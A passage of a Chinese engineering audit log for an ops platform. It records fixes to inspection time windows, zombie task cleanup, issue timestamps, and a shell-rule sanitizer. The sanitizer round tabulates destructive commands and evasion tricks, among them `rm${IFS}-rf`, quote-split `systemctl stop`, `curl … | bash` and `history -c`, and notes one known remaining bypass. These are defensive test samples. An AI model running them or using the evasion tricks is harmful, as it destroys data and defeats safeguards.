| `ops.upload_package`（`content_base64` + `dry_run=true`） | HTTP 200；`dry_run=true`、`staged=false`、`size=32`；文件中心无该包、`data/uploads` 无落盘、`DeployPackage` 计数 14 → 14 |
| `ops.prepare_release_from_local_package`（`content_base64` + `dry_run=true`） | HTTP 200；返回真实预检（`size=32`），未落盘 |
| 高危写工具夹带 `dry_run`（`ops.execute_deploy_plan`） | 缺 `confirm_text` → 400；补上确认短语但夹带 `dry_run` → `400 Unknown tool arguments: dry_run` |
| 全量测试套件 | `pytest tests/ -q` → **1364 passed**（第 3 轮 1348 + 本轮新增 16） |

> 运维提示：本轮修复只改后端（工具适配器 + 风险策略），**需要重启 OPS 才生效**；
> 前端无改动，无需强制刷新。`/api/v2/tools/call` 的响应若出现 `private_key: "***"`，
> 属预期脱敏；若需要辨识"某台服务器用了哪把钥匙"，请使用 `private_key_fingerprint`。

## 第 5 轮（2026-09-12）

本轮范围：**巡检域**（`app/services/inspection_center.py` 6100 行）的时间窗、状态机与任务生命周期。

### 一、已修复

#### 5.1 【中危】未知 `period` 让巡检台账/报表/删除接口直接 500

- **缺陷**：`_period_bounds()` 的最后兜底分支写成
  `start = now.replace(...); return start, end, "daily"`，但该路径下 `end` **从未赋值**
  （只在 daily/weekly/monthly 与显式日期分支赋值）→ `UnboundLocalError`。
  而 API 层 `period: str = "daily"` 是**未校验的字符串**，前端只发 daily/weekly/monthly，
  所以从 UI 点不到、从接口/AI 客户端一调就炸。
- **现场复现（修复前）**：
  `GET /api/v2/inspection/ledger?period=daily` → 200；
  `GET /api/v2/inspection/ledger?period=quarterly` → **HTTP 500 Internal server error**
  （函数级：`UnboundLocalError: cannot access local variable 'end' where it is not associated with a value`）。
  受影响入口：台账 `GET /inspection/ledger`、报表预览 `GET /inspection/reports/periodic-preview`、
  周期报表 `POST /inspection/reports/periodic`、历史删除 `DELETE/POST /inspection/ledger*`
  （删除路径在崩溃点之前就中断，未造成误删）。
- **修复**：兜底分支显式 `return start, now, "daily"`；`period` 归一化时补 `.strip()`
  （`"DAILY "` 之类也能正确归一）。`"quarterly"`/`"7d"` 等未知值按既有设计意图
  兜底为"今日"，并在响应 `summary.period` 中回显归一结果，调用方可感知。
- **回归**：`tests/test_inspection_period_window.py`（23 项）。
- **红灯证据**：修复前 11 项失败，包含 `inspection_center.py:5059 UnboundLocalError`
  经 `inspection_ledger` 与 `delete_inspection_history` 两条路径抛出。

#### 5.2 【低-中】带时区偏移的日期入参按 UTC 归一（此前被当成 UTC 直接使用）

- **缺陷**：`_parse_dt()` 对 `2026-09-10T08:00:00+08:00` 这类带偏移的字符串执行
  `.replace(tzinfo=None)`，**丢掉偏移而不换算**，日期窗整体偏移 8 小时
  （与全仓"持久化时间统一为 naive UTC"的约定不符；`Z` 结尾的串处理是对的，所以问题只在非 UTC 偏移）。
- **修复**：`datetime` 对象与字符串两条路径都改为 `astimezone(timezone.utc).replace(tzinfo=None)`。
- **回归**：同上文件中的 `test_parse_dt_normalizes_offset_to_utc`。

#### 5.3 【中危】巡检任务会永久停在"执行中"（无收尾、无回收）

- **缺陷**：`create_server_inspection_run` / `create_project_inspection_run` 建库时状态**直接就是
  `RUNNING`**，但执行链路上存在多条"未收尾就退出"的路径，且全仓**没有任何僵尸回收逻辑**：

  | 路径 | 中断原因 | 修复前行为 |
  | --- | --- | --- |
  | `execute_server_inspection_run` | `db.query(...)`（读 run 行）、`_load_thresholds(db)` 在 `try` **之外**，SQLite 并发下 `database is locked` 即冒泡 | run 留 RUNNING |
  | `execute_project_inspection_run` | `_get_project_with_relations(db, pid)` 在 `try` 之外 | run 留 RUNNING |
  | `execute_server_inspection_runs_batch` | worker 抛错只写进返回值的 `errors` 列表，**不写库** | 调用方看到"失败 N 台"，历史里仍"执行中" |
  | `_run_one_server_in_new_session` | 批量同步接口 worker 抛错直接冒泡 | run 留 RUNNING |
  | `api/inspection.py::_run_servers_batch_background` | **完全没有 try/except**；`/servers/batch-start` 预建的一批 RUNNING run 在入口整体失败时全部变僵尸 | N 台全部留 RUNNING |
  | 后端进程重启/部署 | 执行是进程内 `BackgroundTasks`/线程池，重启即中断 | 无任何机制回收 |

- **影响**：概览页/历史页永久显示"执行中"，`running_runs` 进度条永远挂在那里，
  运维无法区分"真的在跑"和"残骸"。
- **修复**（四层）：
  1. 新增 `mark_run_failed(db, run_id, message)`：**幂等**、只对 RUNNING/PENDING 生效
     （不覆盖已终结结果），当前会话损坏时自动降级用独立 `SessionLocal()` 写入；
  2. 两个执行器把 `db.query`/`_load_thresholds`/`_get_project_with_relations` 全部纳入
     `try`，任一步失败都走 `mark_run_failed`；`_append_progress` 写入失败不再掩盖原始异常；
  3. 批量 worker（`execute_server_inspection_runs_batch` / `_run_one_server_in_new_session`）
     失败时按 `run_id` 收尾；API 层三个后台包装函数也补兜底，覆盖"批量入口整体失败"；
  4. 新增 `reap_stale_inspection_runs()` 自愈回收器，在概览读取（`_running_runs_with_progress`）时
     先回收僵尸：**同时**满足"自身超过 `INSPECTION_STALE_RUN_SECONDS`（默认 90 分钟）未更新"
     且"最近 `INSPECTION_ACTIVE_HEARTBEAT_SECONDS`（默认 5 分钟）内整个巡检域没有任何 run 推进"
     才判定为僵尸——心跳门控保证批量**排队中**的 run 不会被误杀（同批只要还有 run 在推进就不回收）。
- **回归**：`tests/test_inspection_run_lifecycle.py`（12 项：执行器失败收尾、批量 worker 收尾、
  `mark_run_failed` 幂等/不覆盖终结态/独立会话兜底、回收器正例与三类不误杀、概览自愈）。
- **红灯证据**（暂存源码后）：执行器两个用例以 `RuntimeError: simulated ...` 直接冒泡；
  批量 worker 用例 `AssertionError: assert 'RUNNING' == 'FAILED'`；
  单机 worker 用例 `AssertionError: ['RUNNING']`。

### 二、已排除的"假问题"（本轮审计结论，避免误修）

| 审计项 | 结论 | 证据 |
| --- | --- | --- |
| `_aggregate_risk_counts` 按 `(server, category)` 取最高风险后再计数 | **有意设计**，与 `_compute_score` 的"按机器数平均扣分"公式配套 | 函数 docstring 的 P1-5 说明 + `tests/test_inspection_scoring.py` 20 项通过 |
| 批量 `start` 预先把整批 run 建成 RUNNING | **有意设计**：让前端立即看到批次；本轮只补"失败必收尾 + 僵尸回收" | `api/inspection.py:377-385` |
| `overview` 的未闭环问题计数 | 走聚合查询，与列表 `status=OPEN,PROCESSING` 的 total 一致（沿用第 1 轮结论） | `tests/test_inspection_issue_count_contract.py` 4 项通过 |
| 台账/删除的 5000 行上限 | 有意的保护性上限，`total` 仍用 `count()` 不受列表分页影响 | `inspection_center.py:5135/5139/6080` |
| `period=''`、大小写、别名（day/week/month） | 归一化正确（本轮补了 `.strip()`） | `test_known_periods_normalize` 8 组参数 |
| 生产是否存在历史僵尸 | **没有**：修复前实测 4 条 run 全为 SUCCESS，0 条 RUNNING/PENDING | 只读查询 + 现场实测 |
| `retention`/报告生成链路是否受本轮改动影响 | 未受影响：本轮只改执行收尾与时间窗，报告生成复用 `report_center` | 全量套件 1399 passed |

### 三、待办（后续轮次）

- 巡检域剩余：分析器阈值边界的业务正确性（`_analyze_*` 共 20+ 个，本轮未逐个复核业务口径）、
  自定义规则执行器的注入面复核（`_sanitize_rule_shell` 已存在，需验证绕过可能）。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性。
- 剩余 `except: pass` 静默失败分诊（约 142 处，巡检域已发现 `inspection_periodic_report_payload` 吞掉明细异常）。
- MCP 工具描述正向漂移批量校准；批量改 `auth_type` 时不校验新认证方式凭据。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 5 轮可复现的验证脚本

- `tests/test_inspection_period_window.py`：23 项时间窗（未知周期兜底、别名归一、区间边界、UTC 归一）；
- `tests/test_inspection_run_lifecycle.py`：12 项任务生命周期（收尾幂等 + 僵尸回收不误杀）；
- `fnos-migration/_verify_round5_fixes.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 15088；16 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| `GET /api/v2/inspection/ledger?period=quarterly` | **HTTP 200**（修复前 500），`summary.period="daily"` |
| `GET /api/v2/inspection/reports/periodic-preview?period=7d` | HTTP 200（修复前 500） |
| `GET /inspection/ledger?date_from=2026-09-10T08:00:00+08:00` | HTTP 200，`summary.date_from="2026-09-10T00:00:00"`（偏移已按 UTC 归一） |
| `period=daily/weekly/monthly` | 全部 HTTP 200（既有行为未回归） |
| 插入 3 小时未更新的 RUNNING 探针 run → `GET /api/v2/inspection/overview` | 该 run 被自动标记 **FAILED**，写入 `finished_at`，摘要为"巡检执行中断（后端进程重启或后台任务异常）…"，且不再出现在 `running_runs` |
| 回收前后历史数据 | run 总数 4 → 4，状态全部保持 `SUCCESS`（未误伤） |
| 探针清理 | 删除后残留 0 |
| 全量测试套件 | `pytest tests/ -q` → **1399 passed**（第 4 轮 1364 + 本轮新增 35） |

> 运维提示：本轮同样只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
> 若批量巡检规模很大且把 `run_timeout_seconds` 调得很高，排队中的 run 可能长时间没有自身进度，
> 此时心跳门控仍能防止误回收（同批有 run 在推进即可）；只有在**执行器进程整体停摆**时才会回收，
> 可通过 `INSPECTION_STALE_RUN_SECONDS` 调整判定窗口。

## 第 6 轮（2026-09-12）

本轮范围：**巡检规则只读安全策略的一致性**（自定义 shell 规则的两条执行路径 + 黑名单强度）。

### 一、已修复

#### 6.1 【中危】项目组合巡检绕过只读策略，直接执行自定义规则原文

- **缺陷**：自定义规则命令有两条执行路径，但只有一条做安全校验：

  | 路径 | 入口 | 是否过净化器 |
  | --- | --- | --- |
  | A 单机 / 批量 / 方案巡检 | `execute_server_inspection_run` → `_rule_execution_specs` | ✅ 命中即 `blocked_reason`，不执行 |
  | B 项目组合巡检 | `POST /api/v2/inspection/projects/{id}/combined-run` → `_server_checkers` → `_server_check_specs` → `_build_custom_rule_spec` → `_spec_from_rule_code` | ❌ 不调用净化器，也不看 `blocked_reason`，直接 `_remote_check` 下发 |

  结果是同一条 `systemctl stop nginx` 自定义规则：在单机/批量/方案巡检里被拦，
  在项目组合巡检里**真的在目标服务器上执行**——同一个"只读巡检"承诺出现绕过。
- **修复**：`_spec_from_rule_code` 统一调用 `_sanitize_rule_shell` 并写入 `blocked_reason`；
  `_server_checkers` 对带 `blocked_reason` 的 spec 走 `_blocked_rule_result`（状态 `SKIPPED`）而不下发命令。
- **红灯证据**：`AssertionError: 被拦规则不应执行：'systemctl stop nginx\nrm -rf /data'`
  （`_remote_check` 被真实调用），以及组合巡检 spec 缺 `blocked_reason` 的 `KeyError`。
- **部署后实测**：模块探针规则（`systemctl stop nginx`）在 B 路径 `blocked_reason` 命中、
  A 路径同样命中；只读探针规则两条路径均放行。

#### 6.2 【中危】黑名单本身强度不足：13/24 破坏性写法可绕过，且已有误拦

净化器是"只读巡检"的唯一运行时防线，本轮实测其实际强度（24 个样本）：

| 类别 | 修复前 | 修复后 |
| --- | --- | --- |
| 破坏性样本被拦 | **11/24**（`rm -rf`、`chmod -R`、`dd of=`、`> /etc/`、`systemctl stop`、DML、`bash -c rm`、…） | **24/24** |
| 破坏性样本漏网 | **13/24**（详见下表） | 0 |
| 只读样本误拦 | **1/16**（`grep -E 'systemctl stop' /var/log/messages` 这类只读日志搜索被误杀） | 0 |

修复前漏网样本（实测全部放行 ✗）：

| 漏网写法 | 危害 | 原因 |
| --- | --- | --- |
| `rm /data/important.txt` | 删除文件 | 原正则要求 `rm` 后必须跟 `-` 参数 |
| `find /data -delete` | 批量删除 | 未覆盖 `-delete` |
| `sed -i s/a/b/ /etc/hosts` | 就地改写配置 | 未覆盖 `-i` |
| `truncate -s 0 /var/log/syslog` | 清空日志 | 未覆盖 |
| `crontab -r` / `history -c` | 清空定时任务 / 审计线索 | 未覆盖 |
| `userdel ops` / `passwd ops` | 删号 / 改密 | 未覆盖 |
| `mount -o remount,rw /` / `umount /data` | 重新挂载可写 / 卸载 | 未覆盖 |
| `systemctl st"op" nginx`、`systemctl 'stop' nginx` | 停服务 | 关键字被引号拆分，正则按字面匹配 |
| `rm${IFS}-rf /data` | 删除 | `${IFS}` 充当空格绕过 `\s+` |
| `curl http://x/y.sh \| bash` | 下载即执行 | 未覆盖管道执行 |
| `python3 -c "import shutil;shutil.rmtree('/data')"` | 任意破坏 | 未覆盖解释器一行式 |

- **修复**：
  1. 扫描前做**归一化**（不改下发命令）：`$IFS`/`${IFS}` → 空格，去掉引号与反斜杠
     → 封堵 `st"op"`、`rebo\ot`、`rm${IFS}-rf` 这类纯语法绕过；
  2. 补齐上述破坏性写法；每条规则都要求"命令词 + 参数"，避免误伤只读用法。
- **零误拦验证**（关键安全网）：加固后 19 条内置规则、12 个内置巡检项命令**全部仍放行**；
  收尾过程中曾因"一刀切拦 `find -exec`"与"未要求管道前空白"误拦 4 条内置规则
  （`find … -exec tail`、`find … -exec sha256sum`、`ps -ef | egrep a|b|c|python|node …`），
  已据此把规则收紧为 `-exec <破坏性命令>` 与 `\s\|\s*(python|node|sh|…)`，
  并把这组"内置规则/命令永不被拦"固化为回归测试。
- **局限（明确写入 docstring，非安全边界）**：黑名单只能拦住"明显破坏性"写法，
  无法证明一条规则真的只读。真正的边界是"谁能编写规则"（管理端 + 审计）。
  已知残留：管道前无空格的 `curl x|bash` 不拦（换取不误伤 `egrep a|b|sh` 这类只读交替）。

#### 6.3 【低-中】命令存于 `config.commands` 的规则在组合巡检里被静默跳过

- **缺陷**：`_rule_execution_specs` 支持 `rule_content` **或** `config.commands/shell/cmd`
  两种命令来源，而组合巡检路径的 `_spec_from_rule_code` 只读 `rule_content`：
  这类规则在组合巡检里**连一条结果行都不产生**（既无失败也无跳过），运维无从发现。
- **修复**：`_spec_from_rule_code` 补上同一套 config 命令回退，再统一过净化器。
- **红灯证据**：`AssertionError: config.commands 形式的规则不得被静默跳过 / assert 0 == 1`。

#### 6.4 【低-中】同一分类挂多条规则时，组合巡检只执行第一条

- **缺陷**：`_build_custom_rule_spec` 用 `.order_by(sort_order).first()` 只取一条，
  而 `_server_check_specs` 每个分类只 append 一个 spec；主路径 `_rule_execution_specs`
  却是"该分类下全部规则"。一个巡检项挂 2 条规则时：
  组合巡检跑 1 条、单机/批量跑 2 条，另一条被静默丢弃。
- **修复**：新增 `_build_custom_rule_specs()`（按 `sort_order` 收集 `InspectionItemRule`
  全部关联 + 该分类全部启用规则并去重，逐条构建 spec），`_server_check_specs` 改为 extend；
  `_build_custom_rule_spec` 保留为"取第一条"的兼容包装。
- **红灯证据**：`AssertionError: 组合巡检 1 条 vs 单机/批量 2 条 / assert 1 == 2`。

#### 6.5 规则接口新增 `command_policy`（作者侧可见，含内置规则）

- 规则写路径（`create_rule`/`update_rule`）此前**只校验 `risk_level`/`scope_type`，完全不校验
  `rule_content`**，作者无法预知自己的规则会不会在执行时被跳过。
- 现在 `GET/POST/PATCH /inspection/rules` 的每条规则（含 16 条未落库的内置规则）都返回
  `command_policy: {readonly_allowed, reason}`，与执行时的判定共用同一实现
  （`_rule_command_policy` → `_sanitize_rule_shell`），`readonly_allowed=false` 即在执行时会被跳过。
- **连带风险已处理**：`command_policy` 是展示字段，`_builtin_rule_by_code` 的
  "剔除非模型字段"名单同步加入该键，否则编辑内置规则时
  `InspectionRule(**base)` 会 `TypeError`；已补回归用例
  `test_builtin_rule_can_still_be_materialized`。

### 二、已排除 / 记录（本轮审计结论，避免误修）

| 审计项 | 结论 |
| --- | --- |
| 是否已有"执行任意命令"的 MCP 工具绕过巡检策略 | **没有**：`app/services/tool_adapters/` 下无通用命令执行适配器；工具层最高风险写入工具均带确认闸门（第 4 轮结论） |
| 画像 / 问题重试路径是否也绕过策略 | 未绕过：`inspection_profiles.run_profile` / `run_issue_retry` 都走 `run_servers_batch_inspection` → 净化路径 |
| 项目侧规则路径（`_project_rule_check_specs`） | 复用 `_rule_execution_specs`，本就净化 ✅ |
| `app/services/inspection.py` | **死模块**（全仓无调用方，仅硬编码只读命令），存在同样的净化缺失但不可达，本轮不改，仅记录 |
| `find`/`grep`/`ps` 等只读统计写法 | 全部保留放行（含 `find -printf/-ls/-exec tail`、`ps -ef \| egrep a\|b\|c`），已固化为测试 |

### 三、待办（后续轮次）

- 巡检域剩余：20+ 个 analyzer 的业务判定口径逐个复核（本轮只覆盖策略与执行路径）。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性；批量改 `auth_type` 不校验新凭据。
- 剩余 `except: pass` 静默失败分诊（巡检域已见 `inspection_periodic_report_payload` 吞掉明细异常）。
- MCP 工具描述正向漂移批量校准；`update_issue` 状态机（重开时 `fixed_at`/`verified_at` 残留）。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 6 轮可复现的验证脚本

- `tests/test_inspection_rule_policy_scope.py`（57 项）：两路径判定一致、被拦规则不下发、
  多规则分类全部执行、config 命令来源、净化器双向表驱动（24 破坏 + 19 只读）、内置规则零误拦；
- `fnos-migration/_verify_round6_sanitizer.py`（未入库）：内置规则/命令零误拦 + 绕过样本收敛；
- `fnos-migration/_verify_round6_rules.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 20584；18 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| `GET /api/v2/inspection/rules` | HTTP 200，**19/19** 条规则都带 `command_policy`，内置规则全部 `readonly_allowed=true` |
| `POST /inspection/rules`（`systemctl stop nginx` 探针） | HTTP 200，返回 `readonly_allowed=false` + 拦截原因（策略在执行时拦截，不在写入时拒绝新规则） |
| `POST /inspection/rules`（`df -PTh` 探针） | HTTP 200，返回 `readonly_allowed=true` |
| 服务层 A 路径（`_rule_execution_specs`） | 危险探针命中 `blocked_reason`；只读探针放行 |
| 服务层 B 路径（`_server_check_specs`，即组合巡检） | 危险探针命中 `blocked_reason`（修复前会下发执行）；只读探针放行；同分类 2 条规则均生成 spec |
| 生产数据复原 | 规则 3→3、巡检项配置 16→16、巡检项关联 17→17，无残留探针；接口可见 19→19 条 |
| 全量测试套件 | `pytest tests/ -q` → **1456 passed**（第 5 轮 1399 + 本轮新增 57） |

> 运维提示：本轮只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
> 规则编辑器可读取 `command_policy.readonly_allowed` 提前给出"该规则执行时会被跳过"的提示；
> 该字段缺失时（老客户端）行为不变，规则照旧在执行时被拦截。

## 第 7 轮（2026-09-12）

本轮范围：**风险问题闭环生命周期**（状态机时间戳、截止时间写入路径、未闭环口径）。

### 一、已修复

#### 7.1 【中危】闭环时间戳与状态不自洽（详情页"闭环时间线"直接说谎）

`update_issue` 只在"进入 FIXED/VERIFIED"时写时间戳，**离开这些状态时不清空**，且直接
VERIFIED 不补 `fixed_at`。风险中心详情弹窗（`IssueDetailModal.tsx` 的"闭环时间线"）
直接展示这两列，因此出现四类矛盾数据：

| 操作序列 | 修复前 | 修复后 |
| --- | --- | --- |
| FIXED → 重开（OPEN/PROCESSING） | 状态"处理中"但**仍显示修复时间**，看起来已修好 | 两个时间戳清空 |
| 直接 VERIFIED（跳过 FIXED） | **有验证时间、无修复时间** | 自动补 `fixed_at`，两者成对 |
| FIXED → IGNORED | 仍保留修复时间 | 清空 |
| 重复提交同一状态 | `fixed_at`/`verified_at` 被**刷新**（改写闭环时长） | 保留首次发生时间 |

- **修复**：状态流转时按"时间戳只存在于 FIXED/VERIFIED"的不变量统一维护；
  重复提交同状态幂等（保留首次时间），FIXED↔VERIFIED 回退时按新状态重写。
- **红灯证据**：`AssertionError: 重开后不应保留修复时间 / assert ('2026-09-12T15:53:17.497869' is None)`、
  `验证时间存在时修复时间不得为空`、`重复 FIXED 不应刷新修复时间`。
- **部署后实测**：探针问题 FIXED（写入修复时间）→ 重复 FIXED（时间不变）→ VERIFIED（两者齐全）
  → 重开 PROCESSING（两者清空）全部符合预期。

#### 7.2 【中危】`deadline_at` 没有任何写入路径（"截止时间"永远是空）

排查确认：`deadline_at` 只有三处出现——模型列、序列化字段（`_issue_to_dict`）、前端展示列，
**全仓不存在任何写入点**。后果：详情页"截止时间"永远为 `-`；`ops.risk.triage` 描述里承诺的
"超期"维度永远无法触发（无数据可判）。

- **修复**：`UpdateIssuePayload` 增加 `deadline_at`（ISO8601，支持 `Z`/`+08:00`），
  服务层 `_parse_deadline_at` 解析：带时区统一转 **naive UTC**（与全平台持久化口径一致），
  空串表示清除，非法格式返回 400（不再静默忽略）。
- **红灯证据**：`assert None == '2026-10-01T12:00:00'`（写不进去）、
  `Failed: DID NOT RAISE`（非法值原本无从校验）。
- **部署后实测**：`2026-10-01T20:00:00+08:00` → 存为 `2026-10-01T12:00:00`；
  `2026/10/01` → HTTP 400；空串 → 清除为 `null`。

#### 7.3 【中危】`ops.risk.triage` 漏掉"处理中（PROCESSING）"风险，与全平台未闭环口径不一致

平台口径在四处明确写死为 **未闭环 = OPEN + PROCESSING**：
`overview.open_issue_count`（L5159-5161）、issue 列表 `status=OPEN,PROCESSING`（L5025-5026）、
看板/报表合计（L5189-5190、L5307）。但面向 AI/Agent 的 `ops.risk.triage`
（其自身描述也写着"未闭环 = status 传 OPEN,PROCESSING"）实际调用
`list_risks({"status": "OPEN"})` → **在办风险被排除在优先级建议之外**，
高危处理清单与总览数字不一致。

- **修复**：口径改为 `OPEN,PROCESSING`；同时兑现工具描述里承诺的**超期维度**
  （同等级内超期优先、条目新增 `overdue`/`status`/`deadline_at` 字段、摘要追加超期数量），
  并把描述中并未实现的"生产/重复"字样改为与实现一致的表述（避免描述正向漂移）。
- **红灯证据**：`AssertionError: PROCESSING（在办）风险必须进入分流清单`、
  `超期的高危应排在同级最前：['A 未超期', 'B 已超期', ...]`。
- **部署后实测**：生产未闭环 = 列表 `OPEN,PROCESSING` total **12** = `overview.open_issue_count` **12**
  （只算 OPEN 是 11，即修复前 triage 会报 11）；triage 摘要报"未闭环风险 12 个"，
  清单 12 条，状态集合 `['OPEN','PROCESSING']`，条目带 `overdue` 字段。

### 二、已排除 / 记录（本轮审计结论，避免误修）

| 审计项 | 结论 |
| --- | --- |
| `_aggregate_risk_counts` 的 `normal` 按行计数、而高/中/低按 `(server, category)` 去重 | **不是 BUG**：`tests/test_inspection_scoring.py::test_aggregate_normal_count` 明确锁定"normal = PASS 且 risk_level=NONE 的行数"语义（`normal_count` 展示的是正常项数，参与评分的只有高中低），本轮不改；仅作为口径说明记录 |
| AI/MCP 是否能改风险状态 | **不能**：`ops.risk.update_status`/`ops.risk.verify`/`ops.risk.ignore` 均为审批占位（恒返回 `requires_human_approval=true`），唯一写入路径是网页 PATCH → `update_issue`，本轮修复即覆盖全部消费者 |
| 风险问题自动建档 | 正常：`_save_result` 对 `risk_level∈{HIGH,MEDIUM,LOW}` 且 `status∈{RISK,WARNING,ERROR}` 建档；生产 20 条 item_result → 12 条风险项 → 12 条问题，逐条对得上 |
| `triage` 的"重复风险"维度 | 未实现（需标题相似度聚类），已从描述中移除，列为后续增强，非本轮缺陷 |
| `deadline_at` 的到期提醒/通知 | 无调度消费方（仅展示），本轮只补齐写入路径，不做通知 |

### 三、待办（后续轮次）

- 巡检域 20+ 个 analyzer 的业务判定口径逐个复核。
- 前端竞态与假交互；部署/执行/维护链路确认闸门与回滚一致性；批量改 `auth_type` 不校验新凭据。
- 剩余 `except: pass` 静默失败分诊；`period` 等 API 参数校验。
- MCP 工具描述与 `mcp_capability_service.py` 能力目录的一致性巡检（两处描述来源易漂移）。
- 保留清单：密钥轮换（待业主决定）、`ENV=local` 关闭生产安全轨相关项、fnOS/OpenClaw 遗留项。

### 附：第 7 轮可复现的验证脚本

- `tests/test_inspection_issue_lifecycle.py`（14 项）：状态机时间戳不变量、截止时间写入/清除/校验、
  triage 未闭环口径与超期排序；
- `fnos-migration/_verify_round7_issues.py`（未入库）：对**部署后的 OPS 生产进程**做端到端实测。

#### 部署后实测证据（2026-09-12，OPS 重启后 PID 37260；20 项断言全部 OK）

| 实测项 | 结果 |
| --- | --- |
| 未闭环口径一致性 | 列表 `status=OPEN,PROCESSING` total = **12** = `overview.open_issue_count` **12**（只算 OPEN 为 11） |
| `ops.risk.triage` | 摘要"当前未闭环风险 **12** 个，建议优先处理 8 个高危风险。"，清单 12 条，状态集合 `['OPEN','PROCESSING']`，条目含 `overdue` |
| 探针问题状态机 | FIXED → 修复时间写入；重复 FIXED 时间不变；VERIFIED → 修复+验证齐全；重开 PROCESSING → 两者清空 |
| 截止时间 | `+08:00` 归一为 UTC `2026-10-01T12:00:00`；`2026/10/01` → **400**；空串 → `null` |
| 生产数据复原 | 探针问题删除后问题总数 12→12、总览未闭环 12→12、无残留 |
| 全量测试套件 | `pytest tests/ -q` → **1470 passed**（第 6 轮 1456 + 本轮新增 14） |

> 运维提示：本轮只改后端，**需重启 OPS 生效**（前端无改动，无需 Ctrl+F5）。
> 前端风险中心已能设置截止时间（PATCH `deadline_at`）并看到 `overdue` 提示；
> 老客户端不传该字段时行为不变。


